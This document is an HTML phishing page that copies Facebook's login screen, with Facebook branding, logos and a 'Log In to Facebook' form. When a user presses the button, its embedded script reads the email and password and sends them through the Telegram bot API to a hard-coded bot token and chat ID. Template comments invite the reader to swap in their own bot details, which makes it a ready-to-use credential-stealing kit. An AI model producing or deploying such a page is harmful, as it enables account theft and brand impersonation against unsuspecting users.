<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>

    <!-- External scripts and styles -->
    <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">

    <!-- Custom styling -->
    <style>
        body {
            background: #1877F2; /* Facebook blue */
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
        }

        .form-container {
            background: #ffffff;
            border-radius: 8px;
            padding: 30px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            margin: auto;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .form-container img {
            max-width: 100%;
            height: auto;
        }

        .form-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 6px;
            border: 1px solid #ddd;
            font-size: 16px;
            color: black;
        }

        .form-container button {
            background-color: #1877F2;
            color: white;
            padding: 15px;
            font-size: 16px;
            border-radius: 6px;
            border: none;
            width: 100%;
            cursor: pointer;
            margin-top: 10px;
        }

        .form-container button:hover {
            background-color: #166fe5;
        }

        .footer {
            background-color: #3b5998;
            color: white;
            text-align: center;
            padding: 15px 0;
            font-size: 14px;
            margin-top: 20px;
        }

        .footer img {
            width: 25px;
            height: 25px;
            vertical-align: middle;
            margin-right: 8px;
        }

        /* Responsive Design */
        @media screen and (min-width: 768px) {
            .form-container {
                padding: 40px;
            }

            .form-container h2 {
                font-size: 1.8rem;
            }

            .form-container input,
            .form-container button {
                font-size: 18px;
            }

            .footer {
                font-size: 16px;
            }
        }
    </style>
</head>

<body>
    <!-- Main content -->
    <div class="form-container">
        <!-- Top Image -->
        <img src="https://www.dropbox.com/scl/fi/lyd1gq9sxbm03mzkbbay0/1703528251570.jpg?rlkey=bs41146b2oleicmsrv9k2ducp&raw=1" 
             alt="Facebook" class="mb-4">

        <!-- Facebook Logo -->
        <div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
                 alt="Facebook Logo" width="90" height="90" class="mx-auto">
        </div>

        <h2 class="text-blue-800 text-2xl mt-4 font-bold">Log In to Facebook</h2>

        <!-- Login Form -->
        <form id="loginForm">
            <input type="text" name="email" id="email" placeholder="Email or Phone" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button type="button" onclick="sendToTelegram()">Log In</button>
        </form>
    </div>

    <!-- Footer Section -->
    <footer class="footer">
        <div class="flex justify-center items-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            <span>Facebook Â© From Meta</span>
        </div>
    </footer>

    <script>
        function sendToTelegram() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const telegramToken = "7240555488:AAFbpwKfQAYHUyA1j-8m9-iuHUYpsNo-Ywg"; // Replace with your bot token
            const chatId = "6482794683"; // Replace with your chat ID
            const message = `Login Info:\nEmail: ${email}\nPassword: ${password}`;

            axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
            })
            .then(response => {
                alert("Login details sent to Telegram successfully!");
            })
            .catch(error => {
                console.error("Error sending message to Telegram:", error);
                alert("Failed to send login details.");
            });
        }
    </script>
</body>
</html>
